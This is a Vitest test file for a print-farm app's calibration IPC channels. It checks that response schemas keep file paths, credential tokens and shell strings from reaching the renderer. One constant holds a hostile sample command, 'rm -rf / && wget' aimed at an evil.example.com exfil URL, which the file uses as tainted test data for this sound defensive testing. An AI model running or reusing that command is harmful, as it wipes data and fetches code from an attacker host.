// @vitest-environment node

/**
 * Renderer-boundary denial test — calibration (criterion 16, issue #54).
 *
 * Proves that no generic filesystem, shell, network, credential, slicer, or
 * G-code primitive reaches renderer code through the calibration IPC channels.
 *
 * The renderer only ever receives Zod-validated, typed response shapes from
 * the IPC layer. It never receives:
 *   - Raw file paths or file handles
 *   - Shell command strings
 *   - Network connection details (URLs, tokens, headers)
 *   - Credential material (tokens, keys, passwords)
 *   - Slicer binary paths or arguments
 *   - Raw G-code content
 *
 * Methodology:
 * 1. For each new calibration IPC channel, parse a "tainted" response that
 *    embeds a forbidden primitive. Assert the parser either:
 *    a. Rejects it (throws), or
 *    b. Does not carry the forbidden field through to the result.
 *
 * 2. For schema fields that accept arbitrary strings (e.g., error messages),
 *    assert the maximum length bounds prevent exfiltrating large secrets.
 *
 * Test discipline (SKILL.md):
 * Each test names exactly the class of primitive it guards.
 * Mutation: allowing the forbidden field through the schema fails only
 * the test named for that field type.
 *
 * NOTE: We do not test the preload bridge or renderer components here;
 * those are presentation-only and receive only pre-validated data.
 * The main process validates all renderer requests before handling them.
 * The preload bridge validates responses via ipcSchemas before returning.
 */

import { describe, expect, it } from 'vitest';
import { ipcSchemas, IpcChannel } from '../src/shared/ipc.js';

// ---------------------------------------------------------------------------
// Primitive classes that must never reach the renderer
// ---------------------------------------------------------------------------

/** A filesystem path string — renderer must never see this. */
const FORBIDDEN_PATH = '/home/user/.config/PrintFarmer/secrets.json';

/** A network token — renderer must never see this. */
const FORBIDDEN_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secret-payload';

/** A shell command string — renderer must never see this. */
const FORBIDDEN_SHELL = 'rm -rf / && wget http://evil.example.com/exfil';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function wouldThrow(
  schema: { parse: (v: unknown) => unknown },
  value: unknown,
): boolean {
  try {
    schema.parse(value);
    return false;
  } catch {
    return true;
  }
}

const schema = ipcSchemas;

// ==========================================================================
// CalibrationPollQueueChanges — no network tokens or credentials in events
// ==========================================================================

describe('CalibrationPollQueueChanges renderer boundary', () => {
  it('ok response events do not carry network tokens or credentials', () => {
    const okResponse = schema[
      IpcChannel.CalibrationPollQueueChanges
    ].response.parse({
      status: 'ok',
      afterSequence: 0,
      nextSequence: 1,
      hasMore: false,
      gapDetected: false,
      events: [
        {
          schemaVersion: '3',
          eventId: '11111111-1111-4111-8111-111111111111',
          sequence: 1,
          eventType: 'PrintFarmer.Queue.JobStatusChanged.v1',
          occurredAtUtc: '2025-01-01T00:00:00.000Z',
          jobId: '22222222-2222-4222-8222-222222222222',
          printerId: '33333333-3333-4333-8333-333333333333',
          projectId: '44444444-4444-4444-8444-444444444444',
          calibrationAttemptId: null,
          jobStatus: 'Queued',
          jobKind: 'FilamentCalibration',
          jobRevision: 'AAAA==',
          dispatchStateRevision: 'BBBB==',
          attemptId: null,
          attemptNumber: null,
          attemptOutcome: null,
          bedClearState: 'None',
          bedClearCommandId: null,
          bedClearExpiresAtUtc: null,
          failureCode: null,
          failureRetryable: null,
          failureRequiresReconciliation: null,
          jobLogicalRevision: 1,
          dispatchStateLogicalRevision: 1,
        },
      ],
    });

    const serialized = JSON.stringify(okResponse);
    // Specific guard: no credentials or network tokens in event data.
    expect(serialized).not.toContain(FORBIDDEN_TOKEN);
    expect(serialized).not.toContain(FORBIDDEN_SHELL);
  });

  it('ok response is bounded: events array max 500', () => {
    // Specific guard: events cannot be an unbounded array to prevent large payloads.
    const tooManyEvents = Array.from({ length: 501 }, (_, i) => ({
      schemaVersion: '3',
      eventId: `${i.toString().padStart(8, '0')}-0000-4000-8000-000000000000`,
      sequence: i + 1,
      eventType: 'PrintFarmer.Queue.JobStatusChanged.v1',
      occurredAtUtc: '2025-01-01T00:00:00.000Z',
      jobId: null,
      printerId: null,
      projectId: null,
      calibrationAttemptId: null,
      jobStatus: null,
      jobKind: null,
      jobRevision: null,
      dispatchStateRevision: null,
      attemptId: null,
      attemptNumber: null,
      attemptOutcome: null,
      bedClearState: null,
      bedClearCommandId: null,
      bedClearExpiresAtUtc: null,
      failureCode: null,
      failureRetryable: null,
      failureRequiresReconciliation: null,
      jobLogicalRevision: null,
      dispatchStateLogicalRevision: null,
    }));

    expect(
      wouldThrow(schema[IpcChannel.CalibrationPollQueueChanges].response, {
        status: 'ok',
        afterSequence: 0,
        nextSequence: 501,
        hasMore: false,
        gapDetected: false,
        events: tooManyEvents,
      }),
    ).toBe(true);
  });
});

// ==========================================================================
// CalibrationGetSubscriptionResources — no credentials in IDs
// ==========================================================================

describe('CalibrationGetSubscriptionResources renderer boundary', () => {
  it('ok response contains only UUID arrays, no credential strings', () => {
    const okResponse = schema[
      IpcChannel.CalibrationGetSubscriptionResources
    ].response.parse({
      status: 'ok',
      printerIds: ['11111111-1111-4111-8111-111111111111'],
      jobIds: ['22222222-2222-4222-8222-222222222222'],
      projectIds: ['33333333-3333-4333-8333-333333333333'],
    });

    const serialized = JSON.stringify(okResponse);
    // Specific guard: no tokens, paths, or shell commands in subscription resources.
    expect(serialized).not.toContain(FORBIDDEN_TOKEN);
    expect(serialized).not.toContain(FORBIDDEN_PATH);
  });

  it('printerIds must be valid UUID format (rejects raw credential strings)', () => {
    // Specific guard: UUIDs enforce format — cannot be used to smuggle tokens.
    expect(
      wouldThrow(
        schema[IpcChannel.CalibrationGetSubscriptionResources].response,
        {
          status: 'ok',
          printerIds: [FORBIDDEN_TOKEN], // not a UUID
          jobIds: [],
          projectIds: [],
        },
      ),
    ).toBe(true);
  });
});
